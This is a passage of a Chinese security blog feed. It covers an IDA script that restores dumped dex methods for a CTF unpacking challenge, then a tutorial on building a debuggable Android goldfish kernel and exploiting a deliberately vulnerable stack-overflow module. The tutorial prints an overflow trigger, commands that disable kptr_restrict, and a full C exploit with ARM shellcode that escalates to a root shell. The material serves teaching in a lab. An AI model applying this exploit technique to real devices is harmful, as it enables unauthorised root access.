<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/python</div><div class="line"># -*- coding: utf8 -*-</div><div class="line"></div><div class="line"># 该脚本用于在ida中使用dump下来的method指令对 dex 进行Patch</div><div class="line">import re</div><div class="line">from dex_parser import dex</div><div class="line"></div><div class="line">#存储 存放dump数据的字典</div><div class="line">data_array = []</div><div class="line">#用来避免多次patch</div><div class="line">patched = []</div><div class="line">file_data = &quot;&quot;</div><div class="line"></div><div class="line">def parse_meta_data(data=&quot;&quot;):</div><div class="line">    # print data</div><div class="line">    ret = &#123;&#125;</div><div class="line">    tokens = re.findall(&quot;\[class=(.*?),.*?method=(.*?),.*?codeSize=(.*?)\]&quot;,data)</div><div class="line">    # print tokens</div><div class="line"></div><div class="line">    ret[&apos;class_name&apos;] = tokens[0][0][1:].replace(&apos;/&apos;,&apos;.&apos;).replace(&apos;;&apos;,&apos;&apos;)</div><div class="line">    ret[&apos;method&apos;] = tokens[0][1]</div><div class="line">    ret[&apos;code_size&apos;] = int(tokens[0][2]) * 2 #dex文件格式定义，总大小为 codeSize*2</div><div class="line">    # print ret</div><div class="line">    return ret</div><div class="line"></div><div class="line">#注释，用于给ida执行</div><div class="line"># def patch_byte(a, b):</div><div class="line">#     print hex(b),</div><div class="line"></div><div class="line">def patch(dest, src, size):</div><div class="line">    print &quot;dest::&#123;&#125;, src::&#123;&#125;, size::&#123;&#125;&quot;.format(dest, src, size)</div><div class="line">    for i in range(size):</div><div class="line">        patch_byte(dest + i, int(file_data[ src + i].encode(&apos;hex&apos;), 16))</div><div class="line"></div><div class="line">    print &quot;\n&quot;</div><div class="line"></div><div class="line">def parse_dump_data(filename):</div><div class="line">    global file_data</div><div class="line">    with open(filename, &quot;rb&quot;) as fp:</div><div class="line">        file_data = fp.read()</div><div class="line"></div><div class="line">    #使用正则表达式把说明dump数据的元数据加载到内存</div><div class="line">    all_item = re.findall(&quot;-------------- \(KL\)resolving(.*?) in pid:.*?\(name: task_name\)&quot;, file_data)</div><div class="line">    offset = 0</div><div class="line">    for meta_data in all_item:</div><div class="line">        try:</div><div class="line">            #使用字典组织数据</div><div class="line">            #&#123;&apos;class_name&apos;: &apos;com.example.jiajiatest.MainActivity&apos;, &apos;code_size&apos;: 306, &apos;method&apos;: &apos;add&apos;, &apos;data_offset&apos;: 7175&#125;</div><div class="line"></div><div class="line">            ret = parse_meta_data(meta_data)</div><div class="line">            data_addr = file_data.find(&apos;(name: task_name)&apos;, offset) + 17</div><div class="line">            ret[&apos;data_offset&apos;] = data_addr</div><div class="line">            data_array.append(ret)</div><div class="line">            offset = data_addr</div><div class="line">        except Exception as e:</div><div class="line">            raise e</div><div class="line"></div><div class="line">    return data_array</div><div class="line"></div><div class="line">def get_method_addr(method_data, signature_str):</div><div class="line">    for md_name in method_data:</div><div class="line">        if signature_str in md_name:</div><div class="line">            return method_data[md_name]</div><div class="line">    return -1</div><div class="line"></div><div class="line">def patch_dex(dump_data_file, dex_file):</div><div class="line">    dump_data = parse_dump_data(dump_data_file)</div><div class="line">    dex_obj = dex.dex_parser(dex_file)</div><div class="line">    method_data = dex_obj.get_class_data()</div><div class="line"></div><div class="line">    for item in dump_data:</div><div class="line">        signature_str = &quot;&#123;&#125;::&#123;&#125;&quot;.format(item[&apos;class_name&apos;], item[&apos;method&apos;])</div><div class="line">        if  signature_str not in patched:</div><div class="line"></div><div class="line">            #获取要patch的目标地址</div><div class="line">            addr = get_method_addr(method_data, signature_str)</div><div class="line">            if addr == -1:</div><div class="line">                print &quot;&#123;&#125; can&apos;t get insns addr&quot;.format(signature_str)</div><div class="line">                continue</div><div class="line">            #do patch</div><div class="line">            print &quot;patch &quot; + signature_str,</div><div class="line">            patch(addr,item[&apos;data_offset&apos;],item[&apos;code_size&apos;])</div><div class="line">            patched.append(signature_str)</div><div class="line"></div><div class="line">    # print patched</div><div class="line">    # for i in patched:</div><div class="line">    #     print i</div><div class="line"></div><div class="line">import pprint</div><div class="line"></div><div class="line">patch_dex(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;,&quot;F:\code_workplace\ida_script\classes.dex&quot; )</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    print &quot;comming main&quot;</div><div class="line">    # parse_dump_data(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;)</div><div class="line">    # patch_dex(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;,&quot;F:\code_workplace\ida_script\classes.dex&quot; )</div><div class="line">    # dex_obj = dex.dex_parser(&quot;F:\code_workplace\ida_script\classes.dex&quot;)</div><div class="line">    # class_data = dex_obj.get_class_data()</div><div class="line">    # pprint.pprint(class_data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    # parse_meta_data(&quot;-------------- (KL)resolving [class=Lcom/example/jiajiatest/HttpRunner;, method=makeImgHttpGET, methodIndex=13, insSize=2, insns_d=6daf04d8, codeSize=270] in pid: 20406(name: task_name)&quot;)</div></pre></td></tr></table></figure>
<p>patch前后对比：</p>
<p>patch前</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508763745193jfvdw2et.png?imageslim" alt="raw"><br>patch后</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508763780531bdpdup3e.png?imageslim" alt="paste image"></p>
<p>这时已经可以看到程序的主体逻辑了。然后查看字符串就可以拿到flag………</p>
<h3 id="我干的傻事"><a href="#我干的傻事" class="headerlink" title="我干的傻事"></a>我干的傻事</h3><ul>
<li><p>代码循环条件忘记写了，导致越界，一打开应用就报错。 </p>
</li>
<li><p>文件打开失败，貌似是权限问题，我直接暴力把 <code>/data/local/tmp</code> 改成 777</p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 分析安卓底层代码的错误，要关注 <code>logcat</code> 日志，找到出问题的代码点，然后把库的带符号版本放到ida中分析<br>分析bug, 要看代码的关键逻辑， 判断条件等。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>要多实践，如有问题请在下面评论。</p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安卓脱壳 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Android内核漏洞利用技术实战：环境搭建&栈溢出实战]]></title>
      <url>/2017/08/14/android_kernel_explit_part1.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Android</code>的内核采用的是 <code>Linux</code> 内核，所以在<code>Android</code>内核中进行漏洞利用其实和在 一般的 x86平台下的 <code>linux</code> 内核中进行利用差不多。主要区别在于 <code>Android</code> 下使用的是<code>arm</code>汇编以及环境的搭建方面。本文对我最近的实践做一个分享，其实很简单。</p>
<h3 id="内核调试环境搭建"><a href="#内核调试环境搭建" class="headerlink" title="内核调试环境搭建"></a>内核调试环境搭建</h3><p>搭建平台:    <code>ubuntu 16.04</code></p>
<p>这里使用 <code>android</code> 模拟器来进行内核调试。首先下载内核代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git</div></pre></td></tr></table></figure>
<p>然后下载 <code>github</code> 上的一个安卓漏洞利用的项目，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/Fuzion24/AndroidKernelExploitationPlayground.git kernel_exploit_challenges</div></pre></td></tr></table></figure></p>
<p>然后使用项目中的 <code>patch</code> 文件把 <code>patch</code> 内核编译配置，来把项目中的带漏洞的模块编译进 <code>linux</code> 内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">git am --signoff &lt; ../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch &amp;&amp; \</div><div class="line">cd .. &amp;&amp; ln -s $(pwd)/kernel_exploit_challenges/ goldfish/drivers/vulnerabilities</div></pre></td></tr></table></figure></p>
<p>这里注意： <code>goldfish</code> 目录和  <code>kernel_exploit_challenges</code> 目录要在同一目录下</p>
<p>然后下载 <code>arm-linux-androideabi-4.6</code> 交叉编译工具链 。下载完成后把它解压后，然后把它加到环境变量中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">tar xvf arm-linux-androideabi-4.6.tar.bz2 </div><div class="line">export PATH=$(pwd)/arm-linux-androideabi-4.6/bin/:$PATH</div></pre></td></tr></table></figure>
<p>然后进入 <code>goldfish</code> 目录，开始编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">make goldfish_armv7_defconfig &amp;&amp; make -j8</div></pre></td></tr></table></figure></p>
<p>编译完成后，就会有两个主要的文件：<code>goldfish/vmlinux</code> 和 <code>goldfish/arch/arm/boot/zImage</code>。前面那个用于在调试时 <code>gdb</code> 加载，后面的用于在安卓模拟器启动时加载。</p>
<p>下面下载 安卓 <code>sdk</code> , 用来下载和运行 安卓模拟器。</p>
<p><code>sdk</code> 下载地址： <code>http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz</code></p>
<p>然后把<code>sdk</code> 解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">tar xvf android-sdk_r24.4.1-linux.tgz</div></pre></td></tr></table></figure></p>
<p>把 android-sdk-linux/tools  加入环境变量，把下面的命令添加到 ~/.bashrc 的末尾&lt;把命令中的目录改成你的目录&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export PATH=/home/haclh/hacktools/android-sdk-linux/tools:$PATH</div></pre></td></tr></table></figure></p>
<p>然后重新打开一个shell, 使用下面的命令 &lt;要先下载jdk ,并且设置好环境变量&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">android</div></pre></td></tr></table></figure></p>
<p>然后把下面标注的两个下载下来</p>
<p>来<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1512056420990rincxky6.png?imageslim" alt="paste image"><br>下载完后。首先查看下载的镜像文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">$android list targets</div><div class="line">Available Android targets:</div><div class="line">----------</div><div class="line">id: 1 or &quot;android-19&quot;</div><div class="line">     Name: Android 4.4.2</div><div class="line">     Type: Platform</div><div class="line">     API level: 19</div><div class="line">     Revision: 4</div><div class="line">     Skins: HVGA, QVGA, WQVGA400, WQVGA432, WSVGA, WVGA800 (default), WVGA854, WXGA720, WXGA800, WXGA800-7in</div></pre></td></tr></table></figure>
<p>然后创建 模拟器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">android create avd --force -t &quot;android-19&quot; -n kernel_challenges</div></pre></td></tr></table></figure></p>
<p>然后进入 goldfish 目录，使用下面的命令来使用我们的内核来运行模拟器，并在 1234 端口起一个 gdbserver 来方便进行 内核调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">emulator -show-kernel -kernel arch/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</div></pre></td></tr></table></figure></p>
<p>第一次运行有类似的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">$ emulator -show-kernel -kernel arch/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</div><div class="line">WARNING: userdata image already in use, changes will not persist!</div><div class="line">Creating filesystem with parameters:</div><div class="line">    Size: 576716800</div><div class="line">    Block size: 4096</div><div class="line">    Blocks per group: 32768</div><div class="line">    Inodes per group: 7040</div><div class="line">    Inode size: 256</div><div class="line">    Journal blocks: 2200</div><div class="line">    Label: </div><div class="line">    Blocks: 140800</div><div class="line">    Block groups: 5</div><div class="line">    Reserved block group size: 39</div><div class="line">Created filesystem with 11/35200 inodes and 4536/140800 blocks</div><div class="line">WARNING: cache image already in use, changes will not persist!</div><div class="line">Creating filesystem with parameters:</div><div class="line">    Size: 69206016</div><div class="line">    Block size: 4096</div><div class="line">    Blocks per group: 32768</div><div class="line">    Inodes per group: 4224</div><div class="line">    Inode size: 256</div><div class="line">    Journal blocks: 1024</div><div class="line">    Label: </div><div class="line">    Blocks: 16896</div><div class="line">    Block groups: 1</div><div class="line">    Reserved block group size: 7</div><div class="line">Created filesystem with 11/4224 inodes and 1302/16896 blocks</div><div class="line">......................</div><div class="line">......................</div><div class="line">......................</div></pre></td></tr></table></figure></p>
<p>为了便于后面的操作我们需要把 交叉编译工具链 添加到环境变量里。把下面的命令添加到 ~/.bashrc 的末尾&lt;把命令中的目录改成你的目录&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">export</div><div class="line">PATH=/home/haclh/hacktools/arm-linux-androideabi-4.6/bin/:$PATH</div></pre></td></tr></table></figure></p>
<p>然后重新开个 shell, 进入到 goldfish 目录，加载 vmlinux 以便调试内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arm-linux-androideabi-gdb vmlinux</div></pre></td></tr></table></figure></p>
<p>如果一切正常，应该可以得到下面的类似输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">GNU gdb (GDB) 7.3.1-gg2</div><div class="line">Copyright (C) 2011 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;--host=x86_64-apple-darwin --target=arm-linux-android&quot;.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</div><div class="line">Reading symbols from &lt;REDACTED&gt;/goldfish/vmlinux...done.</div><div class="line">(gdb)</div></pre></td></tr></table></figure></p>
<p>然后连接 模拟器里面的 调试端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">(gdb) target remote :1234</div><div class="line">Remote debugging using :1234</div><div class="line">cpu_v7_do_idle () at arch/arm/mm/proc-v7.S:74</div><div class="line">74movpc, lr</div><div class="line">(gdb)</div></pre></td></tr></table></figure></p>
<p>如果能看到这样的输出说明已经可以正常进行内核调试了。</p>
<p>内核栈溢出漏洞利用     </p>
<p>首先看看漏洞代码， <code>kernel_exploit_challenges/challenges/stack_buffer_overflow/module/stack_buffer_overflow.c</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#include &lt;linux/module.h&gt;</div><div class="line">#include &lt;linux/kernel.h&gt;</div><div class="line">#include &lt;linux/init.h&gt;</div><div class="line">#include &lt;linux/proc_fs.h&gt;</div><div class="line">#include &lt;linux/string.h&gt;</div><div class="line">#include &lt;asm/uaccess.h&gt;</div><div class="line">#define MAX_LENGTH 64</div><div class="line">MODULE_LICENSE(&quot;GPL&quot;);</div><div class="line">MODULE_AUTHOR(&quot;Ryan Welton&quot;);</div><div class="line">MODULE_DESCRIPTION(&quot;Stack Buffer Overflow Example&quot;);</div><div class="line">static struct proc_dir_entry *stack_buffer_proc_entry;</div><div class="line">int proc_entry_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)</div><div class="line">&#123;</div><div class="line">    char buf[MAX_LENGTH];</div><div class="line">    if (copy_from_user(&amp;buf, ubuf, count)) &#123;</div><div class="line">        printk(KERN_INFO &quot;stackBufferProcEntry: error copying data from userspace\n&quot;);</div><div class="line">        return -EFAULT;</div><div class="line">    &#125;</div><div class="line">    return count;</div><div class="line">&#125;</div><div class="line">static int __init stack_buffer_proc_init(void)</div><div class="line">&#123;</div><div class="line">    stack_buffer_proc_entry = create_proc_entry(&quot;stack_buffer_overflow&quot;, 0666, NULL);</div><div class="line">    stack_buffer_proc_entry-&gt;write_proc = proc_entry_write;</div><div class="line">    printk(KERN_INFO &quot;created /proc/stack_buffer_overflow\n&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line">static void __exit stack_buffer_proc_exit(void)</div><div class="line">&#123;</div><div class="line">    if (stack_buffer_proc_entry) &#123;</div><div class="line">        remove_proc_entry(&quot;stack_buffer_overflow&quot;, stack_buffer_proc_entry);</div><div class="line">    &#125;</div><div class="line">    printk(KERN_INFO &quot;vuln_stack_proc_entry removed\n&quot;);</div><div class="line">&#125;</div><div class="line">module_init(stack_buffer_proc_init);</div><div class="line">module_exit(stack_buffer_proc_exit);</div></pre></td></tr></table></figure>
<p>上述代码会创建 <code>/proc/stack_buffer_overflow</code> 设备文件 ，当向该设备文件调用 <code>write</code> 系统调用时会调用 <code>proc_entry_write</code> 函数进行处理。</p>
<p>漏洞显而易见，在 <code>proc_entry_write</code> 函数中 定义了一个 <code>64</code> 字节大小的栈缓冲区<code>buf</code>， 然后使用 <code>copy_from_user(&amp;buf, ubuf, count)</code> 从用户空间 拷贝数据到 <code>buf</code>,数据大小和内容均用户可控。于是当我们输入超过<code>64</code>字节时我们能够覆盖其他的数据，比如返回地址等，进而劫持程序执行流到我们的 <code>shellcode</code> 中 进行提权。</p>
<p>首先我们来试试触发漏洞。先把模拟器打开，然后 adb shell 进入模拟器，使用  echo 命令向 /proc/stack_buffer_overflow 设备输入72字节的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt;  /proc/stack_buffer_overflow</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15120564582742ufjathg.png?imageslim" alt="paste image"><br>可以看到 pc 寄存器的值 为 0x41414141 成功劫持。测试时该内核没开 pxn ，所以我们可以在用户态编写shellcode让内核去执行。提取的方式很简单，内核态调用   <code>commit_creds(prepare_kernel_cred(0));</code>  提升权限为 root, 然后返回 用户态 执行 <code>execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</code> 起一个 <code>root</code> 权限的 <code>shell</code>， 完成提权。</p>
<p>下面先获取 <code>prepare_kernel_cred</code> 和 <code>commit_creds</code> 函数的地址。在 <code>/proc/kallsyms</code> 文件中保存着所有的内核符号的名称和它在内存中的位置。</p>
<p>不过在最近的内核版本中，为了使利用内核漏洞变得更加困难，<code>linux</code> 内核目前禁止一般用户获取符号。具体可以看这里。</p>
<p>当启用 <code>kptr_restrict</code>是我们不能获取内核符号地址的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@generic:/ # cat /proc/kallsyms | grep commit_creds                        </div><div class="line">00000000 T commit_creds</div></pre></td></tr></table></figure></p>
<p>在本文中，把它禁用掉，不管他。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">root@generic:/ # echo 0 &gt; /proc/sys/kernel/kptr_restrict                       </div><div class="line">root@generic:/ # cat /proc/kallsyms | grep commit_creds                        </div><div class="line">c0039834 T commit_creds</div><div class="line">root@generic:/ # cat /proc/kallsyms | grep prepare_kernel_cred                 </div><div class="line">c0039d34 T prepare_kernel_cred</div></pre></td></tr></table></figure>
<p>禁用掉之后，我们就可以通过 <code>/proc/kallsyms</code> 获取 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code>的地址。</p>
<p>至此，提权的问题解决了，下面就是要回到用户态，在<code>x86</code>平台有 <code>iret</code>指令可以回到用户态，在<code>arm</code>下返回用户态就更简单了。在<code>arm</code>下 <code>cpsr</code> 寄存器的 <code>M[4：0]</code> 位用来表示 处理器的运行模式，具体可以看<a href="http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html" target="_blank" rel="external">这个</a>。</p>
<p>所以我们把 <code>cpsr</code> 寄存器的 <code>M[4：0]</code> 位设置为 <code>10000</code> 后就表示 处理器进入了用户模式。</p>
<p>所以现在的利用思路是：</p>
<ul>
<li><p>调用 <code>commit_creds(prepare_kernel_cred(0))</code> 提升权限</p>
</li>
<li><p>调用 <code>mov r3, #0x40000010;   MSR    CPSR_c,R3;</code>设置 <code>cpsr</code>寄存器，使<code>cpu</code>进入用户模式</p>
</li>
<li><p>然后执行 <code>execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</code> 起一个 <code>root</code> 权限的 <code>shell</code></p>
</li>
</ul>
<p>最后的 <code>exp</code> :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#define MAX             64</div><div class="line">int open_file(void)</div><div class="line">&#123;</div><div class="line">        int fd = open(&quot;/proc/stack_buffer_overflow&quot;, O_RDWR);</div><div class="line">        if (fd == -1)</div><div class="line">                err(1, &quot;open&quot;);</div><div class="line">        return fd;</div><div class="line">&#125;</div><div class="line">void payload(void)</div><div class="line">&#123;</div><div class="line">                printf(&quot;[+] enjoy the shell\n&quot;);</div><div class="line">                execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</div><div class="line">&#125;</div><div class="line">extern uint32_t shellCode[];</div><div class="line">asm</div><div class="line">(</div><div class="line">&quot;    .text\n&quot;</div><div class="line">&quot;    .align 2\n&quot;</div><div class="line">&quot;    .code 32\n&quot;</div><div class="line">&quot;    .globl shellCode\n\t&quot;</div><div class="line">&quot;shellCode:\n\t&quot;</div><div class="line">// commit_creds(prepare_kernel_cred(0));</div><div class="line">// -&gt; get root</div><div class="line">&quot;LDR     R3, =0xc0039d34\n\t&quot;   //prepare_kernel_cred addr</div><div class="line">&quot;MOV     R0, #0\n\t&quot;</div><div class="line">&quot;BLX     R3\n\t&quot;</div><div class="line">&quot;LDR     R3, =0xc0039834\n\t&quot;   //commit_creds addr</div><div class="line">&quot;BLX     R3\n\t&quot;</div><div class="line">&quot;mov r3, #0x40000010\n\t&quot;</div><div class="line">&quot;MSR    CPSR_c,R3\n\t&quot;</div><div class="line">&quot;LDR     R3, =0x879c\n\t&quot;     // payload function addr</div><div class="line">&quot;BLX     R3\n\t&quot;</div><div class="line">);</div><div class="line">void trigger_vuln(int fd)</div><div class="line">&#123;</div><div class="line">        #define MAX_PAYLOAD (MAX + 2  * sizeof(void*) )</div><div class="line">        char buf[MAX_PAYLOAD];</div><div class="line">        memset(buf, &apos;A&apos;, sizeof(buf));</div><div class="line">        void * pc = buf + MAX +  1 * sizeof(void*);</div><div class="line">        printf(&quot;shellcdoe addr: %p\n&quot;, shellCode);</div><div class="line">        printf(&quot;payload:%p\n&quot;, payload);</div><div class="line">        *(void **)pc  = (void *) shellCode;   //ret addr</div><div class="line">        /* Kaboom! */</div><div class="line">        write(fd, buf, sizeof(buf) );</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">        int fd;</div><div class="line">        fd = open_file();</div><div class="line">        trigger_vuln(fd);</div><div class="line">        payload();</div><div class="line">        close(fd);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512056489982lu7zmzvc.png?imageslim" alt="paste image"><br>参考链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html</div><div class="line"></div><div class="line">http://blog.sina.com.cn/s/blog_6ac051b2010123cz.html</div><div class="line"></div><div class="line">http://bobao.360.cn/learning/detail/3702.html</div><div class="line"></div><div class="line">https://github.com/Fuzion24/AndroidKernelExploitationPlayground</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kernel_exploit </tag>
            
            <tag> android_kernel </tag>
            
